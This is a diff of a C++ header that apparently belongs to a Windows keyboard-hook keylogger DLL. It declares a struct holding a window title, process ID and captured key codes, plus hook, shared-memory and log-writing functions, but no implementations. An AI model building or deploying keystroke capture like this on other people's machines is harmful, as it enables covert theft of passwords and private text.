@@ -1,17 +1,31 @@
 #pragma once
+
+#define MAX_KEY_COUNT 64
+#define TITLE_SIZE 64
+#define KEY_LOG_MEMORY "KEY_LOG_MEMORY"
 #include "pch.h"
+
+struct keyLogInfo
+{
+	char title[TITLE_SIZE];
+	DWORD pid;
+	WPARAM wp[MAX_KEY_COUNT];
+	int keyCnt = 0;
+};
 
 static HINSTANCE hdll;
 void initialize();
 
-extern "C" __declspec(dllexport) void StartHook();
-LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam);
-extern "C" __declspec(dllexport) bool EndHook();
-DWORD WINAPI Thread(LPVOID pData);
-extern "C" __declspec(dllexport) void writeInput();
-//WPARAM* getSharedMemory(int size, LPCTSTR name);
-HANDLE setKeyLogSharedMemory();
-WPARAM* getKeyLogSharedMemory();
+LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam);
+LPCTSTR getSharedMemoryName(int id);
+HANDLE setKeyLogSharedMemory(int windowCnt);
+keyLogInfo* getKeyLogSharedMemory(int windowCnt);
 HANDLE setSharedMemory(int size, LPCTSTR name);
 template<typename T> T* getSharedMemory(int size, LPCTSTR name);
-
+void initKeyLogInfo(keyLogInfo* info);
+void printKeyLog(int windowId);
+void writeKeyLog(int windwowId);
+void getDllPath();
+void refreshKeyLogSharedMemory(keyLogInfo* info);
+void refreshKeyLogSharedMemory(int windowId);
+void myMessageBox(std::string str);
